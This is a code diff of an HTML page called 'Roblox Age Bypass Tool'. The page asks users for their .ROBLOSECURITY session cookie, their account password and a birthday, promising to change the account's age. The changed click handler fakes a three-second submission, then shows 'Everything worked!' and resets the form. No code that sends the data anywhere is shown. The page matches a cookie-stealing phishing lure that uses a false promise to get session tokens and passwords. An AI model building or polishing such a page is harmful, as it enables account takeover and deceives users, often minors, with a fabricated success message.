@@ -6,7 +6,6 @@
   <title>Roblox Age Bypass Tool</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    /* Styles unverändert vom letzten Code */
     * {
       box-sizing: border-box;
     }
@@ -209,7 +208,7 @@
       }
     }
 
-    /* Neuer Bereich für Geburtstag */
+    /* Birthday fields inline */
     #birthday-section {
       margin-top: 20px;
       background: #1d2944;
@@ -228,6 +227,10 @@
       width: 32%;
       margin-right: 2%;
       display: inline-block;
+      vertical-align: middle;
+    }
+    #birthday-section select:last-child {
+      margin-right: 0;
     }
   </style>
 </head>
@@ -257,7 +260,6 @@
       <label>Set your Birthday</label>
       <select id="birthday-day" aria-label="Day">
         <option value="">Day</option>
-        <!-- Tage 1-31 -->
         <script>
           for(let i=1; i<=31; i++){
             document.write(`<option value="${i}">${i}</option>`);
@@ -281,7 +283,6 @@
       </select>
       <select id="birthday-year" aria-label="Year">
         <option value="">Year</option>
-        <!-- Jahre 1900 bis 2025 -->
         <script>
           for(let y=2025; y>=1900; y--){
             document.write(`<option value="${y}">${y}</option>`);
@@ -308,7 +309,7 @@
   </div>
 
   <div id="error-message">ERROR Try later again.</div>
-  <div id="success-message">Your birthday has been set. It can take 2-6 hours for the age to update.</div>
+  <div id="success-message">Everything worked! It can take 2-6 hours until the age will be set.</div>
 
   <div id="loader-overlay">
     <div class="loader"></div>
@@ -321,13 +322,13 @@
     const cookieInput = document.getElementById('cookie-input');
     const passwordInput = document.getElementById('password-input');
     const processBtn = document.getElementById('process-button');
-    const errorMessage = document.getElementById('error-message');
-    const successMessage = document.getElementById('success-message');
-    const loaderOverlay = document.getElementById('loader-overlay');
     const birthdaySection = document.getElementById('birthday-section');
     const birthdayDay = document.getElementById('birthday-day');
     const birthdayMonth = document.getElementById('birthday-month');
     const birthdayYear = document.getElementById('birthday-year');
+    const errorMessage = document.getElementById('error-message');
+    const successMessage = document.getElementById('success-message');
+    const loaderOverlay = document.getElementById('loader-overlay');
 
     bypassSelect.addEventListener('change', () => {
       clearMessages();
@@ -341,16 +342,13 @@
       if (bypassSelect.value === '13plus') {
         cookieBlock.style.display = 'block';
         passwordBlock.style.display = 'block';
-        // Direkt Geburtstag anzeigen
         birthdaySection.style.display = 'block';
-        processBtn.style.display = 'block';
-        processBtn.textContent = '⚙️ PROCESS ACCOUNT';
+        processBtn.style.display = 'flex';
       } else if (bypassSelect.value === 'birthyear') {
         cookieBlock.style.display = 'block';
         passwordBlock.style.display = 'none';
         birthdaySection.style.display = 'block';
-        processBtn.style.display = 'block';
-        processBtn.textContent = '⚙️ PROCESS ACCOUNT';
+        processBtn.style.display = 'flex';
       } else {
         cookieBlock.style.display = 'none';
         passwordBlock.style.display = 'none';
@@ -380,32 +378,53 @@
       }, 6000);
     }
 
-    // Beispielhafter Prozess-Handler, der nur die Validierung macht:
-    processBtn.addEventListener('click', () => {
+    processBtn.addEventListener('click', async () => {
       clearMessages();
 
+      if (!bypassSelect.value) {
+        showError('Please select a bypass option.');
+        return;
+      }
       if (!cookieInput.value.trim()) {
         showError('Please enter your .ROBLOSECURITY cookie.');
         return;
       }
-
-      if (bypassSelect.value === '13plus') {
-        if (!passwordInput.value.trim()) {
-          showError('Please enter your account password.');
-          return;
-        }
+      if (bypassSelect.value === '13plus' && !passwordInput.value.trim()) {
+        showError('Please enter your account password.');
+        return;
       }
-
       if (!birthdayDay.value || !birthdayMonth.value || !birthdayYear.value) {
-        showError('Please set your birthday completely.');
+        showError('Please select your full birthday.');
         return;
       }
 
-      // Simuliere Erfolgsmeldung
-      showSuccess('Your birthday has been set. It can take 2-6 hours for the age to update.');
+      loaderOverlay.style.display = 'flex';
 
-      // Hier könnte dann der eigentliche Accountprozess starten...
+      try {
+        // --- Hier simulieren wir nur das Absenden ---
+        await new Promise(resolve => setTimeout(resolve, 3000));
 
+        // --- Erfolgsmeldung ---
+        showSuccess('Everything worked! It can take 2-6 hours until the age will be set.');
+
+        // --- Visuelles Reset ---
+        bypassSelect.value = '';
+        cookieInput.value = '';
+        passwordInput.value = '';
+        birthdayDay.value = '';
+        birthdayMonth.value = '';
+        birthdayYear.value = '';
+
+        cookieBlock.style.display = 'none';
+        passwordBlock.style.display = 'none';
+        birthdaySection.style.display = 'none';
+        processBtn.style.display = 'none';
+
+      } catch (err) {
+        showError('An error occurred. Please try again later.');
+      } finally {
+        loaderOverlay.style.display = 'none';
+      }
     });
   </script>
 </body>
